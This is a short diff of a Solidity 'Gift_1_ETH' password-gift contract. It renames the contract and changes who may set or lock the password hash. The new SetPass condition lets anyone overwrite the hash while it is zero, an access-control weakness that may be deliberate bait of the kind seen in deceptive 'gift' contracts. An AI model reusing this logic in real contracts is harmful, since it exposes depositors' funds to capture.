@@ -1,9 +1,9 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Gift_1_ETH at 0xb38beba95e0e21a97466c452454debe2658527f7
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GIFT_1_ETH at 0x3597F78c7872DB259CE023aCc34511c7a79F42E3
 */
 pragma solidity ^0.4.19;
 
-contract Gift_1_ETH
+contract GIFT_1_ETH
 {
     bool passHasBeenSet = false;
     
@@ -19,7 +19,7 @@ contract Gift_1_ETH
     public
     payable
     {
-        if(!passHasBeenSet&&(msg.value > 1 ether))
+        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
         {
             hashPass = hash;
             sender = msg.sender;
@@ -49,7 +49,7 @@ contract Gift_1_ETH
     function PassHasBeenSet(bytes32 hash)
     public
     {
-        if(hash==hashPass)
+        if(msg.sender==sender&&hash==hashPass)
         {
            passHasBeenSet=true;
         }
